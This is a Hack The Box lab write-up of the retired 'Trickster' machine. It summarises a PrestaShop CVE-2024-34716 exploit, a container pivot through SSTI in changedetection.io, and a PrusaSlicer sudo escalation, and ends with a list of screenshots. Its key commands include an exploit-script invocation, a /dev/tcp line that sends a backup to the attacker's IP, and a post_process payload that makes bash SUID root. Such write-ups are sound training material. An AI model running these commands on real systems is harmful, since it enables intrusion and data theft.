---
title: HTB Trickster
slug: trickster
lang: en
platform: Hack The Box
category: Multi-Stage Web Exploitation
headline: PrestaShop RCE, container pivot through changedetection.io and PrusaSlicer privilege escalation
difficulty: Retired
objective: Root / Administrator
date: 2024-10-22
tags: [Linux, PrestaShop, Docker, changedetection.io, PrusaSlicer]
---

# HTB Trickster

## Executive Summary

Trickster exposes a shop subdomain with Git leakage and a hidden PrestaShop admin path. The leaked repository and application files reveal enough context to exploit PrestaShop 8.1.5.

## Initial Access

CVE-2024-34716 provides authenticated code execution and a shell. Database credentials from `parameters.php` and cracked hashes allow pivoting to the `james` user.

## Container Pivot

Network enumeration from the host identifies an internal changedetection.io service. SSH port forwarding exposes it locally, and SSTI leads to root access inside the container. Backups inside the container reveal credentials for `adam`.

## Privilege Escalation

`adam` can run PrusaSlicer with sudo. Modifying the metadata inside a `.3mf` project to set a `post_process` command changes `/bin/bash` to SUID root, enabling `/bin/bash -p`.

## Key Commands

```bash
git-dumper http://shop.trickster.htb/.git/ shop-source
```

```bash
python3 exploit.py --url http://shop.trickster.htb --email adam@trickster.htb --local-ip 10.10.16.31 --admin-path admin634ewutrx1jgitlooaj
```

```bash
ssh -L 9000:172.17.0.2:5000 james@trickster.htb
```

```bash
cat changedetection-backup.zip > /dev/tcp/10.10.16.31/4445
```

```bash
post_process = "chmod u+s /bin/bash"
```

```bash
sudo ./prusaslicer -s /tmp/3mf/Trickster.3mf
```

## Evidence Trail

The following screenshots preserve the original lab evidence sequence from the Obsidian notes.

![[Pasted image 20241022171816.png|trickster evidence 01]]

![[Pasted image 20241022171922.png|trickster evidence 02]]

![[Pasted image 20241022172424.png|trickster evidence 03]]

![[Pasted image 20241022172525.png|trickster evidence 04]]

![[Pasted image 20241022173458.png|trickster evidence 05]]

![[Pasted image 20241022173620.png|trickster evidence 06]]

![[Pasted image 20241022173742.png|trickster evidence 07]]

![[Pasted image 20241022174039.png|trickster evidence 08]]

![[Pasted image 20241022174201.png|trickster evidence 09]]

![[Pasted image 20241022174938.png|trickster evidence 10]]

![[Pasted image 20241022175016.png|trickster evidence 11]]

![[Pasted image 20241022175045.png|trickster evidence 12]]

![[Pasted image 20241022175230.png|trickster evidence 13]]

![[Pasted image 20241022175514.png|trickster evidence 14]]

![[Pasted image 20241022181309.png|trickster evidence 15]]

![[Pasted image 20241022181933.png|trickster evidence 16]]

![[Pasted image 20241022182827.png|trickster evidence 17]]

![[Pasted image 20241022182910.png|trickster evidence 18]]

![[Pasted image 20241022183353.png|trickster evidence 19]]

![[Pasted image 20241022183659.png|trickster evidence 20]]

![[Pasted image 20241022183759.png|trickster evidence 21]]

![[Pasted image 20241022184337.png|trickster evidence 22]]

![[Pasted image 20241022185038.png|trickster evidence 23]]

![[Pasted image 20241022185435.png|trickster evidence 24]]

![[Pasted image 20241022190618.png|trickster evidence 25]]

![[Pasted image 20241022190801.png|trickster evidence 26]]

![[Pasted image 20241022190921.png|trickster evidence 27]]

![[Pasted image 20241022191329.png|trickster evidence 28]]

![[Pasted image 20241022192020.png|trickster evidence 29]]

![[Pasted image 20241022192428.png|trickster evidence 30]]

![[Pasted image 20241022192655.png|trickster evidence 31]]

![[Pasted image 20241022193734.png|trickster evidence 32]]

![[Pasted image 20241022193825.png|trickster evidence 33]]

![[Pasted image 20241022194027.png|trickster evidence 34]]

![[Pasted image 20241022195901.png|trickster evidence 35]]

![[Pasted image 20241022200120.png|trickster evidence 36]]

![[Pasted image 20241022200226.png|trickster evidence 37]]

![[Pasted image 20241022200714.png|trickster evidence 38]]

![[Pasted image 20241022201558.png|trickster evidence 39]]

![[Pasted image 20241022201845.png|trickster evidence 40]]

![[Pasted image 20241022201949.png|trickster evidence 41]]

![[Pasted image 20241022202148.png|trickster evidence 42]]

![[Pasted image 20241022202225.png|trickster evidence 43]]

![[Pasted image 20241022202335.png|trickster evidence 44]]

![[Pasted image 20241022202455.png|trickster evidence 45]]

![[Pasted image 20241022202623.png|trickster evidence 46]]

![[Pasted image 20241022202716.png|trickster evidence 47]]

![[Pasted image 20241022203001.png|trickster evidence 48]]

![[Pasted image 20241022203057.png|trickster evidence 49]]

![[Pasted image 20241022203202.png|trickster evidence 50]]

![[Pasted image 20241022203749.png|trickster evidence 51]]

![[Pasted image 20241022204303.png|trickster evidence 52]]

![[Pasted image 20241022210349.png|trickster evidence 53]]

![[Pasted image 20241022210456.png|trickster evidence 54]]

![[Pasted image 20241022210852.png|trickster evidence 55]]

![[Pasted image 20241022210935.png|trickster evidence 56]]

![[Pasted image 20241022211200.png|trickster evidence 57]]
